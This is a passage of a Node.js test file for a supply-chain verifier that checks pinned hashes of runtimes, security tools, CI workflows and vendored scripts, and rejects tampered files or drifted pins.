import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import {
  cpSync, mkdtempSync, mkdirSync, readFileSync, renameSync, symlinkSync, unlinkSync, writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { hashFile, readJson, writeJson } from '../lib/util.mjs';
import * as controlDependencies from '../verify-control-dependencies.mjs';

const { verifyControlDependencies } = controlDependencies;

const CHECKOUT_SHA = 'd23441a48e516b6c34aea4fa41551a30e30af803';
const OTHER_SHA = '0123456789abcdef0123456789abcdef01234567';
const ACTIONS = { 'actions/checkout': CHECKOUT_SHA };
const NODE_VERSION = '24.19.0';
const NODE_LINUX_URL = 'https://nodejs.org/download/release/v24.19.0/node-v24.19.0-linux-x64.tar.xz';
const NODE_LINUX_ARCHIVE_SHA256 = '14b342e71204f811bde6153be8e04b62aef63c236fef92b55f9c83154b409647';
const NODE_LINUX_EXECUTABLE_SHA256 = 'bc17c508ffeed0ec622934f9b7fa72f8e78da65350e63c3eceb56fa688aa5e12';
const NODE_DARWIN_URL = 'https://nodejs.org/download/release/v24.19.0/node-v24.19.0-darwin-arm64.tar.xz';
const NODE_DARWIN_ARCHIVE_SHA256 = '3f1cf157479c1480352083105e13faf9d008ede98e7e157746b6df940d197b94';
const NODE_DARWIN_EXECUTABLE_SHA256 = '27db838bb204ef7c21df2931f5656e4c8fb32e6e947f363a402b49714d32b5b1';
const GITLEAKS_VERSION = '8.30.1';
const GITLEAKS_URL = 'https://github.com/gitleaks/gitleaks/releases/download/v8.30.1/gitleaks_8.30.1_linux_x64.tar.gz';
const GITLEAKS_ARCHIVE_SHA256 = '551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb';
const GITLEAKS_EXECUTABLE_SHA256 = '88f91962aa2f93ac6ab281d553b9e125f5197bbbce38f9f2437f7299c32e5509';
const FOUNDRY_VERSION = '1.7.1';
const FOUNDRY_COMMIT = '4072e48705af9d93e3c0f6e29e93b5e9a40caed8';
const FOUNDRY_URL = 'https://github.com/foundry-rs/foundry/releases/download/v1.7.1/foundry_v1.7.1_linux_amd64.tar.gz';
const FOUNDRY_ARCHIVE_SHA256 = 'cf7e688ed0c4c48adffca788b496076e31060b67ac5afe1e43dbb5499c20c88b';
const FOUNDRY_EXECUTABLE_SHA256 = '4f77da0810de94325734855d0ad58d70640aa8a5b2a837608ddf8c26da34355c';
const PHASE2_RUNNER_COMMAND = 'files="$(node scripts/test-manifest.mjs list runner)"\n          node --test --test-timeout=120000 $files';
const PHASE2_FULL_FORGE_COMMAND = 'FOUNDRY_LIBS=\'["lib/v4-core","lib/v4-periphery"]\' forge test --root packages/contracts --ffi -vv --no-match-path \'test/integration/RobinhoodV4ArchiveFork.t.sol\'';
const PHASE2_ABI_COMMAND = 'files="$(node scripts/test-manifest.mjs list contracts-abi)"\n          FOUNDRY_LIBS=\'["lib/v4-core"]\' node --test --test-timeout=120000 $files';
const ADAPTERS_TEST_COMMAND = 'files="$(node scripts/test-manifest.mjs list adapters)"\n          node --test --test-timeout=120000 $files';
const ADAPTERS_DEPENDENCIES = { '@solana/web3.js': '1.98.4', viem: '2.56.3' };
const REPO_ROOT = join(import.meta.dirname, '..', '..');
const COMMIT_IDENTITY_ALLOWLIST_SCRIPT = readFileSync(join(REPO_ROOT, 'scripts', 'check-commit-identity.mjs'), 'utf8');
const COMMIT_IDENTITY_ALLOWLIST_SHA256 = sha256(COMMIT_IDENTITY_ALLOWLIST_SCRIPT);
const FORK_PIN_VERIFIER_SCRIPT = readFileSync(join(REPO_ROOT, 'scripts', 'verify-fork-pin.mjs'), 'utf8');
const FORK_PIN_VERIFIER_SHA256 = sha256(FORK_PIN_VERIFIER_SCRIPT);
const RELEASE_CLOSURE_BUILDER_MANIFEST_PATH = 'scripts/programmable/vendor/programmable-v4-hook-builder/manifest.json';
const RELEASE_CLOSURE_BUILDER_ROOT = join(REPO_ROOT, 'scripts', 'programmable', 'vendor', 'programmable-v4-hook-builder');
const RELEASE_CLOSURE_BUILDER_MANIFEST = readFileSync(join(REPO_ROOT, RELEASE_CLOSURE_BUILDER_MANIFEST_PATH), 'utf8');
const RELEASE_CLOSURE_BUILDER_SOURCE = JSON.parse(RELEASE_CLOSURE_BUILDER_MANIFEST).source;
const RELEASE_CLOSURE_BUILDER_MANIFEST_SHA256 = sha256(RELEASE_CLOSURE_BUILDER_MANIFEST);
const RELEASE_CLOSURE_BUILDER_SOURCE_TREE_SHA256 = JSON.parse(RELEASE_CLOSURE_BUILDER_MANIFEST).sourceTreeSha256;
const RELEASE_CLOSURE_BUILDER_ENTRYPOINT = JSON.parse(RELEASE_CLOSURE_BUILDER_MANIFEST).entrypoint;
const RELEASE_CLOSURE_BUILDER_UPSTREAM = Object.freeze({
  repositorySha256: RELEASE_CLOSURE_BUILDER_SOURCE.repositorySha256,
  version: 'v0.4.0',
  ref: RELEASE_CLOSURE_BUILDER_SOURCE.ref,
  tree: RELEASE_CLOSURE_BUILDER_SOURCE.tree,
  path: RELEASE_CLOSURE_BUILDER_SOURCE.path,
  normalization: RELEASE_CLOSURE_BUILDER_SOURCE.normalization,
});
const FORK_PIN_VERIFIER_IMPORT_PATH = 'scripts/programmable/lib/keccak.mjs';
const FORK_PIN_VERIFIER_IMPORT_SCRIPT = readFileSync(join(REPO_ROOT, FORK_PIN_VERIFIER_IMPORT_PATH), 'utf8');
const FORK_PIN_VERIFIER_IMPORT_SHA256 = sha256(FORK_PIN_VERIFIER_IMPORT_SCRIPT);
const CONTROL_DEPENDENCY_VERIFIER_SCRIPT = readFileSync(join(REPO_ROOT, 'scripts', 'verify-control-dependencies.mjs'), 'utf8');
const CONTROL_DEPENDENCY_VERIFIER_SHA256 = sha256(CONTROL_DEPENDENCY_VERIFIER_SCRIPT);
const CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH = 'scripts/lib/util.mjs';
const CONTROL_DEPENDENCY_VERIFIER_IMPORT_SCRIPT = readFileSync(
  join(REPO_ROOT, CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH),
  'utf8',
);
const CONTROL_DEPENDENCY_VERIFIER_IMPORT_SHA256 = sha256(CONTROL_DEPENDENCY_VERIFIER_IMPORT_SCRIPT);
const ARCHIVE_FORK_PROOF_TEST_PATH = 'packages/contracts/test/integration/RobinhoodV4ArchiveFork.t.sol';
const ARCHIVE_FORK_PROOF_TEST = readFileSync(join(REPO_ROOT, ARCHIVE_FORK_PROOF_TEST_PATH), 'utf8');
const ARCHIVE_FORK_PROOF_TEST_SHA256 = sha256(ARCHIVE_FORK_PROOF_TEST);
const GITLEAKS_CONFIG = String.raw`[extend]
useDefault = true

[[rules]]
id = "generic-api-key"

[[rules.allowlists]]
description = "Canonical receipt SHA-256 input hashes misclassified as generic API keys"
condition = "AND"
paths = ['''(?:^|/)receipts/r-[0-9]{5}\.json$''']
regexTarget = "line"
regexes = ['''^\s*(?:"decisions/ADR-0002-launchpad-token-issuance\.md": "(?:fe20fd72714625746bd59c7c1d14341496e2bad92ea36bba924cbe11c2c1d95a|4cc79b69d493302b87044e768688b591fbc8418b538b884f3bc73de22480d1a2)"|"docs/modules/token-core\.md": "(?:6a99552ea4f401525dda218ca7f6f0d29ba9b21e1bf37491f260932a68bb38f8|308c53154bb2bae575a005f66270a21dbfb6ded485f313d03f108d8e63dc49ca|99b4318705f44c944268cd2bba928c338c4cf1a18f4e737640c6250618f2246f)"),?\s*$''']

[[rules.allowlists]]
description = "Deterministic pool token-order label misclassified as a generic API key"
condition = "AND"
paths = ['''(?:^|/)feasibility/model\.mjs$''']
regexTarget = "line"
regexes = ['''^\s*token`
  + String.raw`Order: usdgIsCurrency0 \? "USDG_HKMN" : "HKMN_USDG",\s*$''']

[[rules.allowlists]]
description = "Public Solana token mint in the Collector Crypt pack-status test fixture misclassified as a generic API key"
condition = "AND"
paths = ['''(?:^|/)packages/adapters/test/fixtures/collector-crypt/pack-status\.json$''']
regexTarget = "secret"
regexes = ['''^EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v$''']

[[rules.allowlists]]
description = "Public token contract address constant in the Robinhood RPC test misclassified as a generic API key"
condition = "AND"
paths = ['''(?:^|/)packages/adapters/test/robinhood-rpc\.test\.mjs$''']
regexTarget = "secret"
regexes = ['''^0x5fc5360d0400a0fd4f2af552add042d716f1d168$''']

[[rules.allowlists]]
description = "Opt-in live smoke flag in the Collector Crypt adapter card misclassified as a generic API key"
condition = "AND"
paths = ['''(?:^|/)docs/modules/collector-crypt-adapter\.md$''']
regexTarget = "secret"
regexes = ['''^COLLECTOR_CRYPT_LIVE_SMOKE=1$''']
`;
const GITLEAKS_CONFIG_SHA256 = sha256(GITLEAKS_CONFIG);
const CANONICAL_WORKFLOW = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'v4-gates.yml'), 'utf8');
const CANONICAL_FORK_PIN_CANARY = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'fork-pin-canary.yml'), 'utf8');
const CANONICAL_FORK_PROOF = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'fork-proof.yml'), 'utf8');
const CANONICAL_IDENTITY_GATE = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'identity-gate.yml'), 'utf8');
const CANONICAL_CONTROL_GATE = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'control-gate.yml'), 'utf8');

function sha256(value) {
  return createHash('sha256').update(value).digest('hex');
}

function adaptersLockfileFixture(dependencies) {
  const packages = { '': { name: '@hookemon/adapters', version: '0.1.0', dependencies } };
  for (const [name, version] of Object.entries(dependencies)) {
    packages[`node_modules/${name}`] = {
      version,
      resolved: `https://registry.npmjs.org/${name}/-/${name.replace('@solana/', '')}-${version}.tgz`,
      integrity: `sha512-${sha256(`${name}@${version}`)}`,
    };
  }
  return {
    name: '@hookemon/adapters',
    version: '0.1.0',
    lockfileVersion: 3,
    requires: true,
    packages,
  };
}

function fixture() {
  const root = mkdtempSync(join(tmpdir(), 'hookemon-control-deps-'));
  const pack = '{"id":"base"}\n';
  const executable = 'fixture node executable\n';
  const executableSha256 = sha256(executable);
  const runtimeExecutablePath = join(root, 'runtime', 'node');
  mkdirSync(join(root, 'product'), { recursive: true });
  mkdirSync(join(root, 'packs', 'base'), { recursive: true });
  mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
  mkdirSync(join(root, 'runtime'), { recursive: true });
  mkdirSync(join(root, 'packages', 'adapters'), { recursive: true });
  mkdirSync(join(root, 'scripts'), { recursive: true });
  mkdirSync(join(root, 'scripts', 'programmable', 'vendor'), { recursive: true });
  mkdirSync(join(root, 'packages', 'contracts', 'test', 'integration'), { recursive: true });
  mkdirSync(join(root, 'scripts', 'lib'), { recursive: true });
  mkdirSync(join(root, 'scripts', 'programmable', 'lib'), { recursive: true });
  writeFileSync(join(root, '.nvmrc'), '24.19.0\n');
  writeFileSync(join(root, 'packs', 'base', 'pack.json'), pack);
  writeFileSync(runtimeExecutablePath, executable);
  writeFileSync(join(root, '.gitleaks.toml'), GITLEAKS_CONFIG);
  writeFileSync(join(root, '.github', 'workflows', 'v4-gates.yml'), CANONICAL_WORKFLOW);
  writeFileSync(join(root, '.github', 'workflows', 'fork-proof.yml'), CANONICAL_FORK_PROOF);
  writeFileSync(join(root, '.github', 'workflows', 'fork-pin-canary.yml'), CANONICAL_FORK_PIN_CANARY);
  writeFileSync(join(root, '.github', 'workflows', 'identity-gate.yml'), CANONICAL_IDENTITY_GATE);
  writeFileSync(join(root, '.github', 'workflows', 'control-gate.yml'), CANONICAL_CONTROL_GATE);
  writeFileSync(join(root, 'scripts', 'check-commit-identity.mjs'), COMMIT_IDENTITY_ALLOWLIST_SCRIPT);
  writeFileSync(join(root, 'scripts', 'verify-fork-pin.mjs'), FORK_PIN_VERIFIER_SCRIPT);
  cpSync(RELEASE_CLOSURE_BUILDER_ROOT, join(root, 'scripts', 'programmable', 'vendor', 'programmable-v4-hook-builder'), {
    recursive: true,
  });
  writeFileSync(join(root, FORK_PIN_VERIFIER_IMPORT_PATH), FORK_PIN_VERIFIER_IMPORT_SCRIPT);
  writeFileSync(join(root, 'scripts', 'verify-control-dependencies.mjs'), CONTROL_DEPENDENCY_VERIFIER_SCRIPT);
  writeFileSync(join(root, CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH), CONTROL_DEPENDENCY_VERIFIER_IMPORT_SCRIPT);
  writeFileSync(join(root, ARCHIVE_FORK_PROOF_TEST_PATH), ARCHIVE_FORK_PROOF_TEST);
  writeJson(join(root, 'packages', 'adapters', 'package.json'), {
    name: '@hookemon/adapters',
    version: '0.1.0',
    private: true,
    type: 'module',
    engines: { node: '>=24' },
    dependencies: ADAPTERS_DEPENDENCIES,
  });
  writeJson(join(root, 'packages', 'adapters', 'package-lock.json'), adaptersLockfileFixture(ADAPTERS_DEPENDENCIES));
  writeJson(join(root, 'product', 'dependency-pins.json'), {
    schemaVersion: 4,
    controlRuntime: {
      node: NODE_VERSION,
      distributions: {
        'linux-x64': {
          url: NODE_LINUX_URL,
          archiveSha256: NODE_LINUX_ARCHIVE_SHA256,
          executableSha256: NODE_LINUX_EXECUTABLE_SHA256,
        },
        'darwin-arm64': {
          url: NODE_DARWIN_URL,
          archiveSha256: NODE_DARWIN_ARCHIVE_SHA256,
          executableSha256: NODE_DARWIN_EXECUTABLE_SHA256,
        },
      },
    },
    contentAddresses: {
      basePack: { path: 'packs/base/pack.json', sha256: sha256(pack) },
      workflow: { path: '.github/workflows/v4-gates.yml', sha256: sha256(CANONICAL_WORKFLOW) },
      forkProof: { path: '.github/workflows/fork-proof.yml', sha256: sha256(CANONICAL_FORK_PROOF) },
      forkPinCanary: { path: '.github/workflows/fork-pin-canary.yml', sha256: sha256(CANONICAL_FORK_PIN_CANARY) },
      identityGate: { path: '.github/workflows/identity-gate.yml', sha256: sha256(CANONICAL_IDENTITY_GATE) },
      controlGate: { path: '.github/workflows/control-gate.yml', sha256: sha256(CANONICAL_CONTROL_GATE) },
      archiveForkProofTest: { path: ARCHIVE_FORK_PROOF_TEST_PATH, sha256: ARCHIVE_FORK_PROOF_TEST_SHA256 },
      githubActions: ACTIONS,
    },
    controlScripts: {
      commitIdentityAllowlist: {
        path: 'scripts/check-commit-identity.mjs',
        sha256: COMMIT_IDENTITY_ALLOWLIST_SHA256,
      },
      forkPinVerifier: {
        path: 'scripts/verify-fork-pin.mjs',
        sha256: FORK_PIN_VERIFIER_SHA256,
        closure: [
          { path: 'scripts/verify-fork-pin.mjs', sha256: FORK_PIN_VERIFIER_SHA256 },
          { path: FORK_PIN_VERIFIER_IMPORT_PATH, sha256: FORK_PIN_VERIFIER_IMPORT_SHA256 },
        ],
      },
      controlDependencyVerifier: {
        path: 'scripts/verify-control-dependencies.mjs',
        sha256: CONTROL_DEPENDENCY_VERIFIER_SHA256,
        closure: [
          { path: 'scripts/verify-control-dependencies.mjs', sha256: CONTROL_DEPENDENCY_VERIFIER_SHA256 },
          { path: CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH, sha256: CONTROL_DEPENDENCY_VERIFIER_IMPORT_SHA256 },
        ],
      },
      releaseClosureBuilder: {
        path: RELEASE_CLOSURE_BUILDER_MANIFEST_PATH,
        sha256: RELEASE_CLOSURE_BUILDER_MANIFEST_SHA256,
        sourceTreeSha256: RELEASE_CLOSURE_BUILDER_SOURCE_TREE_SHA256,
        entrypoint: RELEASE_CLOSURE_BUILDER_ENTRYPOINT,
        upstream: RELEASE_CLOSURE_BUILDER_UPSTREAM,
      },
    },
    npmDependencies: {
      adapters: {
        packagePath: 'packages/adapters/package.json',
        lockfilePath: 'packages/adapters/package-lock.json',
        dependencies: ADAPTERS_DEPENDENCIES,
      },
    },
    securityTools: {
      gitleaks: {
        version: GITLEAKS_VERSION,
        config: {
          path: '.gitleaks.toml',
          sha256: GITLEAKS_CONFIG_SHA256,
        },
        distributions: {
          'linux-x64': {
            url: GITLEAKS_URL,
            archiveSha256: GITLEAKS_ARCHIVE_SHA256,
            executableSha256: GITLEAKS_EXECUTABLE_SHA256,
          },
        },
      },
    },
    phase1Toolchain: {
      status: 'INTEGRATION_PENDING',
      foundry: {
        version: FOUNDRY_VERSION,
        commit: FOUNDRY_COMMIT,
        distributions: {
          'linux-amd64': {
            url: FOUNDRY_URL,
            archiveSha256: FOUNDRY_ARCHIVE_SHA256,
            executableSha256: FOUNDRY_EXECUTABLE_SHA256,
          },
        },
      },
    },
  });
  return { root, runtimeExecutablePath };
}

function assertWorkflowTamperIsRejected(name, transform) {
  test(name, () => {
    const state = fixture();
    const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
    const tampered = transform(CANONICAL_WORKFLOW);
    assert.notEqual(tampered, CANONICAL_WORKFLOW);
    writeFileSync(workflowPath, tampered);

    const result = verifyFixture(state);

    assert.equal(result.result, 'FAILED', result.errors.join('\n'));
    assert.match(result.errors.join('\n'), /workflow (?:digest|content) mismatch/i);
  });
}

function verifyFixture(fixtureState, options = {}) {
  const { hashRuntimeExecutable, ...verificationOptions } = options;
  return verifyControlDependencies(fixtureState.root, {
    runtimeVersion: 'v24.19.0',
    runtimeExecutablePath: fixtureState.runtimeExecutablePath,
    platform: 'darwin',
    arch: 'arm64',
    hashRuntimeExecutable: hashRuntimeExecutable ?? (() => NODE_DARWIN_EXECUTABLE_SHA256),
    ...verificationOptions,
  });
}

test('verifies the exact runtime executable for the selected platform distribution', () => {
  const state = fixture();
  const result = verifyFixture(state);

  assert.equal(result.result, 'PASSED', result.errors.join('\n'));
  assert.deepEqual(result.errors, []);
  assert.equal(result.node.actual, '24.19.0');
  assert.equal(result.node.distribution, 'darwin-arm64');
  assert.equal(result.node.actualExecutableSha256, result.node.expectedExecutableSha256);
  assert.deepEqual(result.node.workflow, {
    version: NODE_VERSION,
    url: NODE_LINUX_URL,
    archiveSha256: NODE_LINUX_ARCHIVE_SHA256,
    executableSha256: NODE_LINUX_EXECUTABLE_SHA256,
  });
  assert.equal(result.basePack.actualSha256, result.basePack.expectedSha256);
  assert.deepEqual(result.githubActions, {
    'actions/checkout': [
      { workflow: '.github/workflows/control-gate.yml', ref: CHECKOUT_SHA },
      { workflow: '.github/workflows/control-gate.yml', ref: CHECKOUT_SHA },
      { workflow: '.github/workflows/fork-pin-canary.yml', ref: CHECKOUT_SHA },
      { workflow: '.github/workflows/fork-proof.yml', ref: CHECKOUT_SHA },
      { workflow: '.github/workflows/identity-gate.yml', ref: CHECKOUT_SHA },
      { workflow: '.github/workflows/identity-gate.yml', ref: CHECKOUT_SHA },
      { workflow: '.github/workflows/v4-gates.yml', ref: CHECKOUT_SHA },
    ],
  });
  assert.deepEqual(result.forkProof, {
    path: '.github/workflows/fork-proof.yml',
    expectedSha256: sha256(CANONICAL_FORK_PROOF),
    actualSha256: sha256(CANONICAL_FORK_PROOF),
  });
  assert.deepEqual(result.forkPinCanary, {
    path: '.github/workflows/fork-pin-canary.yml',
    expectedSha256: sha256(CANONICAL_FORK_PIN_CANARY),
    actualSha256: sha256(CANONICAL_FORK_PIN_CANARY),
  });
  assert.deepEqual(result.identityGate, {
    path: '.github/workflows/identity-gate.yml',
    expectedSha256: sha256(CANONICAL_IDENTITY_GATE),
    actualSha256: sha256(CANONICAL_IDENTITY_GATE),
  });
  assert.deepEqual(result.controlGate, {
    path: '.github/workflows/control-gate.yml',
    expectedSha256: sha256(CANONICAL_CONTROL_GATE),
    actualSha256: sha256(CANONICAL_CONTROL_GATE),
  });
  assert.deepEqual(result.workflowPolicy, { forbiddenRuntimeKeys: [] });
  assert.deepEqual(result.phase1Toolchain.foundry, {
    version: FOUNDRY_VERSION,
    commit: FOUNDRY_COMMIT,
    distribution: 'linux-amd64',
    url: FOUNDRY_URL,
    archiveSha256: FOUNDRY_ARCHIVE_SHA256,
    executableSha256: FOUNDRY_EXECUTABLE_SHA256,
    workflow: {
      version: FOUNDRY_VERSION,
      commit: FOUNDRY_COMMIT,
      url: FOUNDRY_URL,
      archiveSha256: FOUNDRY_ARCHIVE_SHA256,
      executableSha256: FOUNDRY_EXECUTABLE_SHA256,
    },
  });
  assert.deepEqual(result.securityTools.gitleaks, {
    version: GITLEAKS_VERSION,
    distribution: 'linux-x64',
    url: GITLEAKS_URL,
    archiveSha256: GITLEAKS_ARCHIVE_SHA256,
    executableSha256: GITLEAKS_EXECUTABLE_SHA256,
    config: {
      path: '.gitleaks.toml',
      expectedSha256: GITLEAKS_CONFIG_SHA256,
      actualSha256: GITLEAKS_CONFIG_SHA256,
    },
    workflow: {
      version: GITLEAKS_VERSION,
      url: GITLEAKS_URL,
      archiveSha256: GITLEAKS_ARCHIVE_SHA256,
      executableSha256: GITLEAKS_EXECUTABLE_SHA256,
      configSha256: GITLEAKS_CONFIG_SHA256,
    },
  });
  assert.equal(JSON.stringify(result).includes(state.root), false, 'report must not record local paths');
});

test('accepts the separate fork-proof workflow as a pinned control input', () => {
  const state = fixture();
  const forkProofPath = join(state.root, '.github', 'workflows', 'fork-proof.yml');
  writeFileSync(forkProofPath, CANONICAL_FORK_PROOF);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.contentAddresses.forkProof = {
    path: '.github/workflows/fork-proof.yml',
    sha256: sha256(CANONICAL_FORK_PROOF),
  };
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'PASSED', result.errors.join('\n'));
  assert.deepEqual(result.forkProof, {
    path: '.github/workflows/fork-proof.yml',
    expectedSha256: sha256(CANONICAL_FORK_PROOF),
    actualSha256: sha256(CANONICAL_FORK_PROOF),
  });
});

test('verifies the exact vendored review-target builder manifest pin', () => {
  const state = fixture();

  const result = verifyFixture(state);

  assert.deepEqual(result.controlScripts.releaseClosureBuilder, {
    path: RELEASE_CLOSURE_BUILDER_MANIFEST_PATH,
    expectedSha256: RELEASE_CLOSURE_BUILDER_MANIFEST_SHA256,
    actualSha256: RELEASE_CLOSURE_BUILDER_MANIFEST_SHA256,
    sourceTreeSha256: RELEASE_CLOSURE_BUILDER_SOURCE_TREE_SHA256,
    actualSourceTreeSha256: RELEASE_CLOSURE_BUILDER_SOURCE_TREE_SHA256,
    entrypoint: RELEASE_CLOSURE_BUILDER_ENTRYPOINT,
    upstream: RELEASE_CLOSURE_BUILDER_UPSTREAM,
  });
});

test('records clean-room normalization alongside immutable builder provenance', () => {
  assert.match(RELEASE_CLOSURE_BUILDER_UPSTREAM.repositorySha256 ?? '', /^[0-9a-f]{64}$/);
  assert.equal(RELEASE_CLOSURE_BUILDER_UPSTREAM.normalization, 'cleanroom-labels-v1');
  assert.equal(Object.hasOwn(RELEASE_CLOSURE_BUILDER_UPSTREAM, 'repository'), false);
});

test('rejects a vendored release-closure builder source mutation', () => {
  const state = fixture();
  const sourcePath = join(
    state.root,
    'scripts',
    'programmable',
    'vendor',
    'programmable-v4-hook-builder',
    'scripts',
    'cli-args.mjs',
  );
  writeFileSync(sourcePath, `${readFileSync(sourcePath, 'utf8')}\nexport const CONTROL_SOURCE_MUTATION = true;\n`);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /release-closure builder source tree (?:digest|content) mismatch/i);
});

test('rejects a release-closure builder upstream version drift', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlScripts.releaseClosureBuilder.upstream.version = 'v0.4.1';
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /release-closure builder upstream provenance must match the supported release/);
});

test('rejects a release-closure builder normalization drift', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlScripts.releaseClosureBuilder.upstream.normalization = 'alternate-normalization';
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /release-closure builder upstream provenance must match the supported release/);
});

test('rejects a simultaneous release-closure builder manifest and pin mutation', () => {
  const state = fixture();
  const manifestPath = join(state.root, RELEASE_CLOSURE_BUILDER_MANIFEST_PATH);
  const mutatedManifest = `${RELEASE_CLOSURE_BUILDER_MANIFEST}\n`;
  writeFileSync(manifestPath, mutatedManifest);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlScripts.releaseClosureBuilder.sha256 = sha256(mutatedManifest);
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /release-closure builder manifest (?:digest must match the supported release|content mismatch)/);
});

test('rejects a simultaneous commit-identity checker and candidate pin mutation', () => {
  const state = fixture();
  const mutatedChecker = `${COMMIT_IDENTITY_ALLOWLIST_SCRIPT}\nexport const CANDIDATE_ALLOWLIST_MUTATION = true;\n`;
  writeFileSync(join(state.root, 'scripts', 'check-commit-identity.mjs'), mutatedChecker);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlScripts.commitIdentityAllowlist.sha256 = sha256(mutatedChecker);
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /commit-identity allowlist (?:digest must match the supported release|content mismatch)/);
});

test('rejects a simultaneous fork-pin verifier and candidate pin mutation', () => {
  const state = fixture();
  const mutatedVerifier = `${FORK_PIN_VERIFIER_SCRIPT}\nexport const CANDIDATE_VERIFIER_MUTATION = true;\n`;
  writeFileSync(join(state.root, 'scripts', 'verify-fork-pin.mjs'), mutatedVerifier);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlScripts.forkPinVerifier.sha256 = sha256(mutatedVerifier);
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin verifier (?:digest must match the supported release|content mismatch)/);
});

test('rejects a mutated fork-pin verifier import closure even when its candidate pin is rehashed', () => {
  const state = fixture();
  const mutatedImport = `${FORK_PIN_VERIFIER_IMPORT_SCRIPT}\nexport const CANDIDATE_IMPORT_MUTATION = true;\n`;
  writeFileSync(join(state.root, FORK_PIN_VERIFIER_IMPORT_PATH), mutatedImport);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlScripts.forkPinVerifier.closure[1].sha256 = sha256(mutatedImport);
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin verifier import closure/i);
});

test('rejects an undeclared fork-pin verifier import before workflow execution', () => {
  const state = fixture();
  const verifierPath = join(state.root, 'scripts', 'verify-fork-pin.mjs');
  const extraImportPath = join(state.root, 'scripts', 'fork-pin-extra.mjs');
  writeFileSync(extraImportPath, 'export const extraForkPinDependency = true;\n');
  writeFileSync(verifierPath, `import './fork-pin-extra.mjs';\n${FORK_PIN_VERIFIER_SCRIPT}`);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin verifier import closure imports an undeclared local module/i);
});

test('rejects unsupported fork-pin verifier import syntax before workflow execution', () => {
  const state = fixture();
  const verifierPath = join(state.root, 'scripts', 'verify-fork-pin.mjs');
  writeFileSync(verifierPath, `import './fork-pin-extra.mjs'; // unexpected trailing syntax\n${FORK_PIN_VERIFIER_SCRIPT}`);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin verifier import closure .*unsupported static import syntax/i);
});

test('rejects an unpinned fork-pin verifier package import before workflow execution', () => {
  const state = fixture();
  const verifierPath = join(state.root, 'scripts', 'verify-fork-pin.mjs');
  writeFileSync(verifierPath, `import 'fork-pin-extra-package';\n${FORK_PIN_VERIFIER_SCRIPT}`);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin verifier import closure .*must not import an unpinned module/i);
});

test('the base control checker rejects a candidate verifier import outside the pinned closure', () => {
  const verifyBaseControlSurface = controlDependencies.verifyBaseControlSurface;
  const basePins = readJson(join(REPO_ROOT, 'product', 'dependency-pins.json'));
  const candidatePins = structuredClone(basePins);
  const candidateVerifier = `import './fork-pin-extra.mjs';\n${FORK_PIN_VERIFIER_SCRIPT}`;
  candidatePins.controlScripts.forkPinVerifier.sha256 = sha256(candidateVerifier);
  candidatePins.controlScripts.forkPinVerifier.closure[0].sha256 = sha256(candidateVerifier);

  const candidateBlobs = new Map([
    ['.github/workflows/v4-gates.yml', { mode: '100644', type: 'blob', blobId: '1'.repeat(40), sha256: candidatePins.contentAddresses.workflow.sha256 }],
    ['.github/workflows/fork-proof.yml', { mode: '100644', type: 'blob', blobId: 'a'.repeat(40), sha256: candidatePins.contentAddresses.forkProof.sha256 }],
    ['.github/workflows/fork-pin-canary.yml', { mode: '100644', type: 'blob', blobId: '2'.repeat(40), sha256: candidatePins.contentAddresses.forkPinCanary.sha256 }],
    ['.github/workflows/identity-gate.yml', { mode: '100644', type: 'blob', blobId: '3'.repeat(40), sha256: candidatePins.contentAddresses.identityGate.sha256 }],
    ['.github/workflows/control-gate.yml', { mode: '100644', type: 'blob', blobId: '4'.repeat(40), sha256: candidatePins.contentAddresses.controlGate.sha256 }],
    ['scripts/verify-fork-pin.mjs', { mode: '100644', type: 'blob', blobId: '5'.repeat(40), sha256: candidatePins.controlScripts.forkPinVerifier.closure[0].sha256, bytes: Buffer.from(candidateVerifier) }],
